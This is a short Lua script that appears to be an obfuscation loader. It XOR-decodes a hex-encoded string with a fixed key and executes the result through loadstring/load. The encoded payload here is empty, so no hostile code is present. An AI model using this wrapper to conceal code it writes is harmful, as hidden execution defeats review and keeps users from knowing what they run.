local k={191,232,175,137,123,11,51,19,199,253,11,10,145,98,71,46,42,44,150,208,240,94,192,218,55,88,169,50,221,130,26,33}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
